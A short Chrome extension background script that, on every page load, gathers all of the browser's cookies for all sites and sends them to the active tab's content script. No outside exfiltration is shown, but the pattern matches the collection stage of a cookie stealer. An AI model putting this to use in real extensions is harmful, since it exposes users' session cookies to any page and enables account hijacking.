chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (changeInfo.status == 'complete') {
        chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
            chrome.cookies.getAll({}, function(cookies) {
                chrome.tabs.sendMessage(tabs[0].id, {action: "getCookies",cookies:cookies}, function(response) {});
            });
        });
    }
});